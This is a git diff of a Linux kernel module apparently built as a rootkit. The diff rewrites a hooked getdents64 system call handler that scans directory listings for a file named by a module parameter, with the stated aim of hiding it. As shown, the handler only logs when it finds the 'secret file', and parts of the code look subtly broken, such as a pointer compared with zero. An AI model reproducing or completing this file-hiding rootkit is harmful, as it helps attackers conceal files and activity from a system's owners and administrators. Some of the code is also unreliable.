@@ -3,6 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <asm/unistd.h>
+#include <linux/dirent.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("ROYCO");
@@ -27,13 +28,13 @@ module_param(file_to_hide, charp, 0000);
 MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");
 
 
-struct linux_dirent64 {
-    u64         d_ino;
-    s64         d_off;
-    unsigned short      d_reclen;
-    unsigned char       d_type;
-    char        d_name[];
-};
+// struct linux_dirent64 {
+//     u64         d_ino;
+//     s64         d_off;
+//     unsigned short      d_reclen;
+//     unsigned char       d_type;
+//     char        d_name[];
+// };
 
 
 
@@ -97,33 +98,40 @@ static void __exit rootkit_exit(void) {
 asmlinkage int new_getdents64(const struct pt_regs *regs)
 {
 	int loc;
-	struct linux_dirent64 *dirent;
-	struct linux_dirent64 *dirent_ker = NULL;
+	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent = NULL;
 	unsigned int len;
-	unsigned int index = 0;
+	unsigned long index = 0;
+	unsigned short reclen;
+	long error;
 
 	dirent = (struct linux_dirent64*)(regs->si);
 
 	len = old_getdents64(regs);
-	dirent_ker = kzalloc(len, GFP_KERNEL);
-	copy_from_user(dirent_ker, dirent, len);
-	//printk(KERN_INFO "%lx\n",regs->si);
-	//return len;
+	dirent_kern = kzalloc(len, GFP_KERNEL);
+	if(dirent_kern <=0 || (dirent_kern == NULL))
+		return len;
 
-	//printk(KERN_INFO "%s\n",dirent_ker->d_name);
+	error = copy_from_user(dirent_kern, dirent, len);
+	if (error)
+		goto done;
 	
-	//iterate through the struct to find if it contains the file we want to hide
-	for(index = 0; index < len;)
+	printk(KERN_INFO "%s\n",dirent_kern->d_name);
+
+	while (index < len)
 	{
-		
-		printk("%s\n",dirent_ker->d_name);
-		index += dirent_ker->d_reclen;
-		if(strcmp(dirent_ker->d_reclen,file_to_hide) == 0)
-		{
-			printk(KERN_INFO "secret file was listed.\n");
+		curr_ent = (void*)dirent_kern + index;
+		//printk(KERN_INFO "what's this : %s\n",curr_ent->d_name);
+		if (strcmp(file_to_hide, curr_ent->d_name) == 0){
+			printk(KERN_INFO "found secret file: %s",file_to_hide);
 		}
+		//if (strcmp(dirent_kern))
+		index += curr_ent->d_reclen;
 	}
-	return len;
+	done:
+		kfree(dirent_kern);
+		return len;
+	
+	
 }
 
 
